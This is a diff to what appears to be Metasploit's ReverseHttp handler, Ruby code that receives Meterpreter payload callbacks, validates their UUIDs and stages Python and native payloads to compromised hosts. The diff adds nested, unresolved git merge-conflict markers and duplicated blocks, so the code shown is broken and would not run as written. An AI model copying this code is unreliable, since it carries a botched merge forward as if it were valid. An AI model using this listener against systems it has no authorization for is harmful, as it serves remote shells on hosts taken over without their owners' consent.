@@ -82,10 +82,14 @@ module ReverseHttp
   def listener_uri
     uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
 <<<<<<< HEAD
+<<<<<<< HEAD
     "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
 =======
     "#{scheme}://#{uri_host}:#{bind_port}/"
 >>>>>>> rapid7/master
+=======
+    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
+>>>>>>> master
   end
 
   # Return a URI suitable for placing in a payload.
@@ -243,6 +247,7 @@ protected
     # Configure the UUID architecture and payload if necessary
     uuid.arch      ||= obj.arch
     uuid.platform  ||= obj.platform
+<<<<<<< HEAD
 
     conn_id = nil
     if info[:mode] && info[:mode] != :connect
@@ -266,6 +271,31 @@ protected
       end
     end
 
+=======
+
+    conn_id = nil
+    if info[:mode] && info[:mode] != :connect
+      conn_id = generate_uri_uuid(URI_CHECKSUM_CONN, uuid)
+    end
+
+    request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"
+
+    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
+      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
+      info[:mode] = :unknown_uuid
+    end
+
+    # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
+      allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
+      unless allowed_urls.include?(req.relative_resource)
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID URL: #{request_summary}")
+        info[:mode] = :unknown_uuid_url
+      end
+    end
+
+>>>>>>> master
     self.pending_connections += 1
 
     # Process the requested resource.
@@ -273,10 +303,33 @@ protected
       when :init_connect
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection from #{request_summary}")
 <<<<<<< HEAD
+<<<<<<< HEAD
 
         # Handle the case where stageless payloads call in on the same URI when they
         # first connect. From there, we tell them to callback on a connect URI that
         # was generated on the fly. This means we form a new session for each.
+=======
+
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
+
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
+                                                 'core_patch_url')
+        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
+        resp.body = pkt.to_r
+
+      when :init_python
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
+        url = payload_uri(req) + conn_id + '/'
+
+        blob = ""
+        blob << obj.generate_stage(
+          uuid: uuid,
+          uri:  conn_id
+        )
+>>>>>>> master
 
         # Hurl a TLV back at the caller, and ignore the response
         pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
@@ -374,9 +427,12 @@ protected
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
         uri = URI(payload_uri(req) + conn_id)
 >>>>>>> rapid7/master
+=======
+>>>>>>> master
 
         resp['Content-Type'] = 'application/octet-stream'
 
@@ -386,12 +442,17 @@ protected
           uuid: uuid,
           uri:  conn_id,
 <<<<<<< HEAD
+<<<<<<< HEAD
           lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
           lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
 =======
           lhost: uri.host,
           lport: uri.port
 >>>>>>> rapid7/master
+=======
+          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
+          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
+>>>>>>> master
         )
 
         resp.body = encode_stage(blob)
